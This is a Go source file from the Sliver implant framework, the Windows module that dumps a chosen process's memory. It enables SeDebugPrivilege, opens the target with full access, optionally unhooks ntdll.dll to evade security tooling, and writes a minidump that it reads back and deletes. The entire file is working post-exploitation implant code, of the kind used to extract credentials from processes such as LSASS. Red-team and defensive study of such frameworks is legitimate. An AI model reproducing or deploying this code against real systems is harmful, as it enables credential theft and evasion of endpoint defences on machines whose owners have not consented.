package procdump

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"io/ioutil"

	//{{if .Debug}}
	"log"
	//{{end}}

	// {{if .Evasion}}
	// {{if eq .GOARCH "amd64"}}
	"github.com/bishopfox/sliver/sliver/evasion"
	// {{end}}
	// {{end}}
	"os"

	"github.com/bishopfox/sliver/sliver/priv"
	"github.com/bishopfox/sliver/sliver/syscalls"
	"golang.org/x/sys/windows"
)

const (
	PROCESS_ALL_ACCESS = 0x1F0FFF
)

type WindowsDump struct {
	data []byte
}

func (d *WindowsDump) Data() []byte {
	return d.data
}

func dumpProcess(pid int32) (ProcessDump, error) {
	res := &WindowsDump{}
	if err := priv.SePrivEnable("SeDebugPrivilege"); err != nil {
		return res, fmt.Errorf("Could not set SeDebugPrivilege on", pid)
	}

	hProc, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return res, err
	}
	if hProc != 0 {
		return minidump(uint32(pid), hProc)
	}
	return res, fmt.Errorf("Could not dump process memory")
}

func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
	dump := &WindowsDump{}
	// {{if eq .GOARCH "amd64"}}
	// Hotfix for #66 - need to dig deeper
	// {{if .Evasion}}
	err := evasion.RefreshPE(`c:\windows\system32\ntdll.dll`)
	if err != nil {
		//{{if .Debug}}
		log.Println("RefreshPE failed:", err)
		//{{end}}
		return dump, err
	}
	// {{end}}
	// {{end}}
	// TODO: find a better place to store the dump file
	f, err := ioutil.TempFile("", "")
	if err != nil {
		//{{if .Debug}}
		log.Println("Failed to create temp file:", err)
		//{{end}}
		return dump, err
	}

	if err != nil {
		return dump, err
	}
	stdOutHandle := f.Fd()
	err = syscalls.MiniDumpWriteDump(proc, pid, stdOutHandle, 3, 0, 0, 0)
	if err == nil {
		data, err := ioutil.ReadFile(f.Name())
		dump.data = data
		if err != nil {
			//{{if .Debug}}
			log.Println("ReadFile failed:", err)
			//{{end}}
			return dump, err
		}
		os.Remove(f.Name())
	} else {
		//{{if .Debug}}
		log.Println("Minidump syscall failed:", err)
		//{{end}}
		return dump, err
	}
	return dump, nil
}
